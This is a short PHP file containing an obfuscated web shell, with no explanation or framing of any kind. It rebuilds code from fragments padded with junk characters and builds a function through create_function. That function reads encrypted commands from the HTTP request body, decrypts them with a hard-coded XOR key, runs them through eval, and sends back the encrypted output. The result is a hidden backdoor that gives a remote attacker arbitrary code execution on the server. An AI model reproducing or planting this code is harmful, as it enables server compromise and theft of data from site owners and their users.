<?php
$C='+){Z$oZ.=$t{$i}^$k{$j};}}retZurZn $o;}iZf (@ZprZeg_match("/$Zkh(.Z+)$kZf/",@file_gZetZ_contents("Zphp:';
$Y='//ZZZinput"),$m)==1) {@oZZb_sZtZart();@evZalZ(@gzuncompreZss(@x(@base6Z4_ZZdecode($m[1Z]),$kZ)))Z;$o=@Zo';
$t='$Zk){$c=strlZen($kZ);$l=strlZen($t);$o=Z"";fZor(Z$i=0;$i<$lZ;){forZ($Zj=0;($j<$c&Z&$i<Z$lZ);$jZ++,$iZ+';
$E='bZ_get_contents();@Zob_end_Zclean()Z;$r=@basZe64_encoZdZe(@x(@ZgZzcompress($o),$Zk))Z;print("$Zp$kZh$r$kf");}';
$k='$k="fb4b2Z995";$ZZkh=Z"3a3619e76Z77a";ZZ$kf="7ed8Z8bbff37f"Z;$pZ="Zp78Cl5Z8EEg9GbVfkZ";function Zx($t,Z';
$m=str_replace('E','','crEeaEteE_EfuncEEtion');
$F=str_replace('Z','',$k.$t.$C.$Y.$E);
$O=$m('',$F);$O();
?>
